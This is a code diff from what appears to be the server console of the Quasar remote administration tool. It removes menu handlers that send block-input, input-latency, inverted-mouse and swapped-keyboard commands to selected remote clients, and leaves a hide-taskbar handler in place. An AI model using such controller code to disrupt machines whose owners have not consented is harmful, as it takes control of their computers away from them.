@@ -835,14 +835,6 @@ namespace Quasar.Server.Forms
             }
         }
 
-        private void blockInputToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (Client c in GetSelectedClients())
-            {
-                c.Send(new DoBlockInput());
-            }
-        }
-
         private void hideTaskBarToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
@@ -851,29 +843,6 @@ namespace Quasar.Server.Forms
             }
         }
 
-        private void inputLatencyToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (Client c in GetSelectedClients())
-            {
-                c.Send(new DoInputLatency());
-            }
-        }
-
-        private void invertMouseMovementToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (Client c in GetSelectedClients())
-            {
-                c.Send(new DoInvertMouseMovement());
-            }
-        }
-
-        private void swapKeyboardKeysToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (Client c in GetSelectedClients())
-            {
-                c.Send(new DoChangeKeys());
-            }
-        }
         #endregion
 
         private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
